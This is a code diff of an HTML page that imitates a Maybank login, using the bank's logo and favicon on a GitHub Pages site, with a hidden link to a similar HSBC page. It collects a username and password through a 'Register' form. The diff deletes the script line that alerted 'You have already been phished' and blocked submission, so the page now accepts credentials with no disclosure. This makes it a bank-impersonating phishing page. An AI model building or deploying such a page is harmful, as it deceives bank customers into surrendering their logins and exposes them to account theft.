@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <base href="https://skipo2010.github.io/maybank-details.github.io/"/>
     <meta name="viewport" content="width=device-width, initial-scale=1"/>
     <link href="style.css" rel="stylesheet"/>
     <link href="maybank favi.png" rel="icon" type="x-icon"/>
@@ -18,17 +19,19 @@
     <form action="" class="modal-content animate" method="post" onsubmit="return validateForm()">
         <input type="hidden" value="https://skipo2010.github.io/hsbc-details.github.io/"/>
         <div class="imgcontainer">
-            <span class="close" onclick="document.getElementById('id01').style.display='none'" title="Close Modal">×</span> 
+            <span class="close" onclick="document.getElementById('id01').style.display='none'" title="Close Modal">×</span>
             <img alt="Avatar" class="avatar" src="Logo-Maybank.jpg"/>
         </div>
 
         <div class="container">
-            <label for="uname"><b>Enter your Username <span style="color:red;">*</span></b></label> 
-            <input id="username" name="username" placeholder="Enter Username" required="" type="text"/> 
-            <label for="psw"><b>Enter Your Password <span style="color:red;">*</span></b></label> 
+            <label for="uname"><b>Enter your Username <span style="color:red;">*</span></b></label>
+            <input id="username" name="username" placeholder="Enter Username" required="" type="text"/>
+            <label for="psw"><b>Enter Your Password <span style="color:red;">*</span></b></label>
             <input id="password" name="password" placeholder="Enter Password" required="" type="password"/>
-            <button class="register-button" type="submit">Register</button> 
-            <label> <input checked="checked" type="checkbox"/> Remember me </label>
+            <button class="register-button" type="submit">Register</button>
+            <label>
+                <input checked="checked" type="checkbox"/> Remember me
+            </label>
         </div>
 
         <div class="container" style="background-color:#f1f1f1">
@@ -43,19 +46,18 @@ var modal = document.getElementById('id01');
 
 // When the user clicks anywhere outside of the modal, close it
 window.onclick = function(event) {
-  if (event.target == modal) {
-    modal.style.display = "none";
-  }
+    if (event.target == modal) {
+        modal.style.display = "none";
+    }
 }
 
 function validateForm() {
     var username = document.getElementById('username').value;
     var password = document.getElementById('password').value;
-
-    alert("You have already been phished");
-
-    return false; // Prevent form submission
+    
+ 
 }
 </script>
+
 </body>
 </html>
